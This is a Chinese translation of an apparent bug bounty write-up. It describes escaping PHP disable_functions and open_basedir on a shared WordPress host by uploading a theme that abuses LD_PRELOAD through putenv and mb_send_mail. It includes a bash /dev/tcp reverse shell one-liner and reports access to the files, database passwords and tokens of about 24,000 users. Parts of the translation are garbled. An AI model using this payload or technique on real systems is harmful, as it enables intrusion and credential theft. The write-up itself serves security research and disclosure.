<html>
<head>
<title>How I bypassed disable_functions in php to get a remote shell</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">我是如何绕过php中的disable_functions来获得远程shell的</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/how-i-bypassed-disable-functions-in-php-to-get-a-remote-shell-48b827d54979?source=collection_archive---------0-----------------------#2022-03-13">https://infosecwriteups.com/how-i-bypassed-disable-functions-in-php-to-get-a-remote-shell-48b827d54979?source=collection_archive---------0-----------------------#2022-03-13</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="b0bc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">今天我将向您展示我是如何绕过disable_functions并获得一个远程shell来访问大多数用户的文件的。</p><p id="c9a4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">首先</strong>，这是一个公共节目，但尽管如此，我还是要提到target.com的<strong class="jp ir"> <em class="kl">。</em> </strong></p><h2 id="48c9" class="km kn iq bd ko kp kq dn kr ks kt dp ku jy kv kw kx kc ky kz la kg lb lc ld le bi translated">应用程序逻辑:</h2><p id="39c5" class="pw-post-body-paragraph jn jo iq jp b jq lf js jt ju lg jw jx jy lh ka kb kc li ke kf kg lj ki kj kk ij bi translated">这个目标应用程序的目标是使用WordPress引擎为其域名下的注册用户(例如<strong class="jp ir"><em class="kl">【newblog.target.com】</em></strong>)创建新的博客。</p><p id="f893" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">博客页面可以用应用程序编辑器或WordPress仪表盘来编辑和设计。</p><h2 id="bdda" class="km kn iq bd ko kp kq dn kr ks kt dp ku jy kv kw kx kc ky kz la kg lb lc ld le bi translated">探索:</h2><p id="2121" class="pw-post-body-paragraph jn jo iq jp b jq lf js jt ju lg jw jx jy lh ka kb kc li ke kf kg lj ki kj kk ij bi translated">从我新创建的博客开始，我检查了一下我有哪些特权，允许我使用或修改哪些功能，在下面的截图中，我展示了我的第一次观察！虽然我有<strong class="jp ir">管理员</strong>的角色，但是我的博客没有<strong class="jp ir">编辑器</strong>标签，不像典型的WordPress博客那样。</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div role="button" tabindex="0" class="lq lr di ls bf lt"><div class="gh gi lk"><img src="../Images/0b82aff4342f0f11be183745899c93e5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*NuoQKFiqgkwANPEdr7mJMQ.png"/></div></div></figure><p id="c473" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我无法编辑任何插件或主题，但我可以上传一个新的。</p><p id="b81a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我需要检查上传编辑文件是否有任何限制，还需要检查运行我自己的PHP代码的能力。</p><p id="b893" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因此，我没有编辑当前的主题/插件，而是开始上传一个新的，我下载了一个名为“<strong class="jp ir">空白画布”</strong>的简单主题，并尝试打开主PHP文件，该文件将在应用程序每次加载我的博客时运行，这样我就可以立即获得我的代码的结果，这个文件是<strong class="jp ir">functions.php。</strong></p><p id="8958" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我试着打印一个简单的字符串，一切正常。</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div role="button" tabindex="0" class="lq lr di ls bf lt"><div class="gh gi lw"><img src="../Images/d84662c71021f4a2e9e9c847a2c679b2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*KEplmBJoThqCFUuH4MTtRQ.png"/></div></div></figure><p id="7906" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后我开始用<strong class="jp ir"> shell_exec() </strong>和<strong class="jp ir"> system() </strong>函数等运行任何系统命令，但是没有<strong class="jp ir">没有</strong> <strong class="jp ir">输出！</strong></p><p id="a60e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我猜测这些功能被禁用了，查了一下<strong class="jp ir"> phpinfo() </strong>，我是对的！</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div role="button" tabindex="0" class="lq lr di ls bf lt"><div class="gh gi lx"><img src="../Images/9693315a29f899100510c2978992a8e6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*VJYxQiaz9ps3ZykiD3EWow.png"/></div></div></figure><p id="9657" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果你不知道什么是<strong class="jp ir"> disable_functions </strong>什么是<strong class="jp ir">，</strong>这允许服务器禁用某些PHP功能来提升服务器的安全性，你可以用php.ini文件或服务器配置来设置。</p><p id="26f6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">同样，当我检查<strong class="jp ir"> open_basedir </strong>以检查允许我访问的开放目录时。<strong class="jp ir"/><em class="kl">-所有路径用冒号分隔-。</em></p><p id="7fbe" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我发现我不能访问任何系统文件，只有我上传的和wp文件。</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div role="button" tabindex="0" class="lq lr di ls bf lt"><div class="gh gi lx"><img src="../Images/f316b85fde8d6eaaae238ec5f463f817.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*yHCm3HlA68gAxMT26Ai2GA.png"/></div></div></figure><p id="ba76" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我还从允许的目录中注意到，我的网站子域在以下路径下有自己的文件</p><pre class="ll lm ln lo gt ly lz ma mb aw mc bi"><span id="6644" class="km kn iq lz b gy md me l mf mg">/mnt/customars-<strong class="lz ir">MY_SUBDOAMIN_NAME</strong>-wordpress-pvc-<strong class="lz ir">RANDOM_VALUE</strong>/</span></pre><p id="b034" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这也引起了我的注意，因为如果我的账号/网站在服务器里有目录，<strong class="jp ir">可能这个服务器是共享服务器，里面有其他用户的文件！</strong></p><p id="6402" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果是这样，正如我上面所说的，由于<strong class="jp ir">的open_basedir </strong>策略，我们不能访问它，所以我们需要找到一种方法绕过这些限制，让一个远程shell来浏览服务器文件，以检查我的猜测是否正确。</p><h2 id="ceb9" class="km kn iq bd ko kp kq dn kr ks kt dp ku jy kv kw kx kc ky kz la kg lb lc ld le bi translated">绕过disable_functions:</h2><p id="361b" class="pw-post-body-paragraph jn jo iq jp b jq lf js jt ju lg jw jx jy lh ka kb kc li ke kf kg lj ki kj kk ij bi translated">经过一番研究，我想到了两种方法，我们先讨论其中一种，但在开始之前，有几点需要声明:</p><ul class=""><li id="b0e8" class="mh mi iq jp b jq jr ju jv jy mj kc mk kg ml kk mm mn mo mp bi translated">有一个名为<code class="fe mq mr ms lz b"><strong class="jp ir">LD_PRELOAD</strong></code>的环境变量，它提供了在其他库之前预加载一个库- <em class="kl"> LibraryName.so - </em>的可能性。</li><li id="dcff" class="mh mi iq jp b jq mt ju mu jy mv kc mw kg mx kk mm mn mo mp bi translated">如果我们能够将文件<strong class="jp ir"> </strong>设置为一个在我们控制之下的共享对象的路径，那么文件<strong class="jp ir">将在任何其他库之前被加载，是的，没有PHP的限制！</strong></li><li id="9150" class="mh mi iq jp b jq mt ju mu jy mv kc mw kg mx kk mm mn mo mp bi translated">为此，首先需要运行一个二进制程序。</li></ul><p id="af21" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们有了主要的想法，即将<code class="fe mq mr ms lz b"><strong class="jp ir">LD_PRELOAD</strong></code> <strong class="jp ir"> </strong>环境变量设置或覆盖到一个受控的共享库中。</p><p id="0449" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">简而言之，我们需要以下内容:</p><ol class=""><li id="65d6" class="mh mi iq jp b jq jr ju jv jy mj kc mk kg ml kk my mn mo mp bi translated"><strong class="jp ir">要执行的二进制。</strong></li><li id="80ac" class="mh mi iq jp b jq mt ju mu jy mv kc mw kg mx kk my mn mo mp bi translated">以<strong class="jp ir">的方式设置或覆盖</strong> <code class="fe mq mr ms lz b"><strong class="jp ir">LD_PRELOAD</strong></code> <strong class="jp ir"> </strong>变量。</li><li id="1b56" class="mh mi iq jp b jq mt ju mu jy mv kc mw kg mx kk my mn mo mp bi translated"><strong class="jp ir">创建我们的任意对象</strong>，它可以是二进制或bash脚本，这样我们就可以运行命令或得到一个反向shell。</li></ol><p id="63b0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">PHP中一个著名的函数是<strong class="jp ir"> mail() </strong>函数，如果它是在PHP中执行的话，我知道在我们的例子中它在phpinfo页面中被禁用了。不过，无论如何，这个函数将使用您系统上的<code class="fe mq mr ms lz b"><strong class="jp ir">/user/sbin/sendmail</strong></code> <strong class="jp ir">二进制文件</strong>，PHP将首先在您的<strong class="jp ir"> $PATH </strong>中查找<strong class="jp ir"> sendmail </strong>然后执行它，这正是我们想要的，<strong class="jp ir">但是我们知道它被禁用了，所以我们需要一个替代方案！</strong></p><p id="42bd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">有一个函数的工作原理和"<strong class="jp ir">mail()"</strong>is<strong class="jp ir">" MB _ send _ mail()"</strong>一样但是它只有在<strong class="jp ir"> mbstring </strong>模块被启用的情况下才会工作，让我们重新看一下phpinfo。</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div role="button" tabindex="0" class="lq lr di ls bf lt"><div class="gh gi lx"><img src="../Images/99657e531741e58285edcb1d2c24d62d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*pV_XIiRZr1HPqKJ2ekEjgw.png"/></div></div></figure><p id="3d95" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">很好，已经启用了，现在我们可以使用它了。</p><p id="b80c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">为了设置环境变量，我们可以使用<strong class="jp ir"> putenv() </strong>函数，正如你可能注意到的，它也是<strong class="jp ir">而不是</strong>禁用的。</p><p id="0fe4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">最后一件事是创建我们的任意库，我找到了<a class="ae mz" href="https://github.com/TarlogicSecurity/Chankro" rel="noopener ugc nofollow" target="_blank"> Chankro </a>工具，它将帮助我们完成所有这些，你将把你的<strong class="jp ir">反向shell有效负载</strong>和你控制的<strong class="jp ir">目录</strong>给它，它将为你提供包含在主题文件中的最终PHP代码。</p><p id="00bb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这个工具基于使用<strong class="jp ir"> mail() </strong>函数，所以我们可以很容易地编辑源代码，将<strong class="jp ir"> mail() </strong>改为<strong class="jp ir"> mb_send_mail()。</strong></p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div role="button" tabindex="0" class="lq lr di ls bf lt"><div class="gh gi na"><img src="../Images/2916a5fb04b8aa1c9c52124c1bd22ab3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*D5uX5nvKIfM7VMKmlqEppg.png"/></div></div></figure><p id="c8b9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">保存编辑过的文件，我们可以使用一个简单的反向shell有效负载，如</p><pre class="ll lm ln lo gt ly lz ma mb aw mc bi"><span id="e5d9" class="km kn iq lz b gy md me l mf mg">bash -c 'sh -i &gt;&amp; /dev/tcp/&lt;YOUR_IP&gt;/&lt;YOUR_PORT&gt; 0&gt;&amp;1'</span></pre><p id="9ed3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们可以运行这个工具，结果将是一个包含我们任意代码的PHP文件。</p><p id="17de" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们将其内容添加到“<strong class="jp ir">空白画布”</strong>主题文件中的<strong class="jp ir">functions.php</strong>中并上传。</p><p id="ef0d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">一切都好，我们可以创建一个Netcat监听器并访问我们的网站。</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div role="button" tabindex="0" class="lq lr di ls bf lt"><div class="gh gi nb"><img src="../Images/0b2fb9d9dcbb4a70ddef0a693df0a3f2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/1*oXAFJVVZ7U21ZYZgB_o5Gw.gif"/></div></div></figure><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div role="button" tabindex="0" class="lq lr di ls bf lt"><div class="gh gi nc"><img src="../Images/a070e397720c3cd8fea1639877106f10.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/1*OH9Xtln42wiM-tjMkPdIAQ.gif"/></div></div></figure><p id="262e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们得到了一个反向外壳，现在回到主要目标，我们想知道这是否是一个共享服务器，是否有其他用户的文件。</p><p id="2b08" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">当我搜索时，我找到了大约24000个用户的文件！</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div role="button" tabindex="0" class="lq lr di ls bf lt"><div class="gh gi nd"><img src="../Images/5da00f05443beba7cd5bc74cb70856ed.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ZFTs4j38VrHiLUSvnv-sug.png"/></div></div></figure><p id="7632" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">此外，我还发现了大多数用户的数据库用户名和密码，我还发现了一些其他人的身份验证令牌，等等。</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div class="gh gi ne"><img src="../Images/66964e2658847c6708f12f1d15793c97.png" data-original-src="https://miro.medium.com/v2/resize:fit:996/1*OyATYBlEtENy0QNN2Li8vg.gif"/></div></figure><p id="d502" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我希望你喜欢阅读，如果你有任何反馈，我会很高兴！</p><p id="7263" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">参考资料:<br/><a class="ae mz" href="https://www.macs.hw.ac.uk/~hwloidl/docs/PHP/ref.mail.html" rel="noopener ugc nofollow" target="_blank">https://www.macs.hw.ac.uk/~hwloidl/docs/PHP/ref.mail.html</a><br/>T22】https://www . tarlogic . com/blog/how-to-bypass-disable _ functions-and-open _ basedir/</p></div></div>    
</body>
</html>